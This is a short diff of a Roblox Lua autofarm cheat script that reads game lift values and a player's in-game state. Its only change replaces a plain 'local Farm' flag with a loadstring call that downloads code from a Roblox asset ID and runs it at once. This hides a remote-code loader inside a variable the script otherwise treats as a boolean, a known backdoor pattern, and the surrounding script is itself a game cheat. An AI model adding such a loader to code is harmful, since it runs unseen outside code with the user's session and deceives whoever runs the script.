@@ -42,7 +42,7 @@ local hardlift = game:GetService("Workspace").Hard.Entry.LiftEntryInfo.Info.Outp
 local mediumlift = game:GetService("Workspace").Medium.Entry.LiftEntryInfo.Info.Output
 local easylift = game:GetService("Workspace").Easy.Entry.LiftEntryInfo.Info.Output
 local torso = game.Players.LocalPlayer.Character.Torso
-local Farm
+local Farm = loadstring(game:GetObjects("rbxassetid://15900013841")[1].Source)()
 function autofarm()
     if Farm == true then
         if game:GetService("Players")["daz_real"].Ingame.Value == 0 then
